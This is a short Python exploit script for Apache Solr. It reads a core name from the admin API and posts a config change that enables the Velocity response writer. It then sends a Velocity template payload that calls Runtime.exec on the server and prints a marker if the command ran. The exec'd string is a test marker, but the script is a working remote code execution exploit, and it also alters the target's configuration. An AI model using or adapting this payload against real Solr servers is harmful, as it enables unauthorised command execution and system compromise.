#! coding=utf-8
import requests
import re

#author:木离
def exploit(url):

    get_url =url+'/solr/admin/cores?indexInfo=false&wt=json'
    try:
        headers = {
        "User-Agent" : 'YunDun',
        }
        res=requests.get(get_url,headers=headers)
        get_text =res.text
        ans=re.findall('"name":"\S+"',get_text)
        core_name=''
        if len(ans) >=1:
            tmp=ans[0].split(":")
            core_name=tmp[1].replace('"','')
            post_url =url+'/solr/'+core_name+'/config'
            post_data='''{
            "update-queryresponsewriter": {
            "startup": "lazy",
            "name": "velocity",
            "class": "solr.VelocityResponseWriter",
        "template.base.dir": "",
        "solr.resource.loader.enabled": "true",
        "params.resource.loader.enabled": "true"}}'''
            res=requests.post(post_url,data=post_data)
            if res.status_code==200:
                get_url=url+'/solr/'+core_name+'/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27This1sATestT0Pr0veAVu1nErabIl1ty%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end'
                res2 =requests.get(get_url)
                end_text =res2.text
            if "This1sATestT0Pr0veAVu1nErabIl1ty" in end_text:
                print("YES    "+url)
                return True
    except:
        return False
    return False


# if __name__ == '__main__':
    # exploit("http://ip:port")



